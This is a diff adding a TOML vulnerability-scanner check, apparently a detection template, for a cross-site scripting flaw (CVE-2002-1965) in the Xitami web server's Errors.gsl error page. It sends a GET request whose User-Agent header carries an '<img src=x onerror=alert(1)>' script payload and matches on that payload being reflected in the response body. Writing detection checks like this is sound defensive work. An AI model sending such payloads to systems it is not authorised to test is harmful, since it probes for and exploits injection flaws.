@@ -1,0 +1,28 @@
+[info]
+author = "ave"
+description = "验证 Imatix Xitami 2.5b4/2.5b5 Errors.gsl 模板的跨站脚本漏洞。通过构造包含 JavaScript onerror 事件的 IMG SRC 标签或恶意 User-Agent 字段的 HTTP GET 请求，检测服务器是否将攻击者输入无过滤反射回错误页面，从而触发 XSS 执行。"
+id = "POC-AVE-2002-0735"
+name = "Imatix Xitami Errors.gsl 跨站脚本攻击漏洞 PoC"
+severity = "medium"
+tags = ["ave-2002-0735"]
+vuln_id = [
+    "CVE-2002-1965",
+    "AVE-2002-0735",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/nonexistent"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "<img src=x onerror=alert(1)>"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<img src=x onerror=alert(1)>"]
